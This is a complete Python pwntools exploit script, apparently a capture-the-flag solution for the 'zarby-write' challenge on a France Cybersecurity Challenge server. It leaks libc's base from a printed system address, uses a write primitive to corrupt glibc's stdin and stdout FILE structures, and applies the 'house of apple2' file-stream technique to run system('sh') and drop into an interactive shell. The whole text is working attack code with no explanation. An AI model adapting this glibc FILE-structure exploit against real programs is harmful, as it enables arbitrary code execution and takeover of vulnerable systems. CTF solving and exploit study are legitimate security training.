from pwn import *
from pwncli import *

if args.LOCAL:
    io = process('./zarby-write_patched')
    if args.GDB:
        cmd = """
        """
        gdb.attach(io, cmd)
else:
    io = remote('challenges.france-cybersecurity-challenge.fr', 2102)

elf = context.binary = ELF('./zarby-write_patched')
libc = ELF('./libc-2.37.so')    

def write_(addr, what):
    io.sendline('{} {}'.format(addr, what).encode())

io.recvuntilb(b'system@libc: ')

libc.address = int(io.recv(14), 16) - libc.sym.system
print(hex(libc.address))

stdin = libc.sym._IO_2_1_stdin_
stdout = libc.sym._IO_2_1_stdout_

byte_to_write = ((stdin+131) // 0x100) & 0xff

write_(libc.sym._IO_2_1_stdin_+56, stdin+131-0x100)

target = libc.sym._IO_2_1_stdout_
payload = p8(byte_to_write-1).ljust(125, b"\x00")
payload += p64(0xfbad208b) 
payload += p64(stdin) 
payload += p64(0) * 5
payload += p64(target) 
payload += p64(target + 0x200) 
payload = payload.ljust(0x101, b"\x00")
io.sendline(payload)

_IO_wfile_jumps = libc.sym._IO_wfile_jumps

#_IO_wstrn_jumps_addr = libc.sym._IO_wstrn_jumps
#print(hex(_IO_wstrn_jumps_addr))
data = IO_FILE_plus_struct().house_of_apple2_execmd_when_exit(stdout, libc.sym._IO_wfile_jumps, libc.sym.system, "sh")

print(data)
pause()
io.sendline(data)

io.interactive()
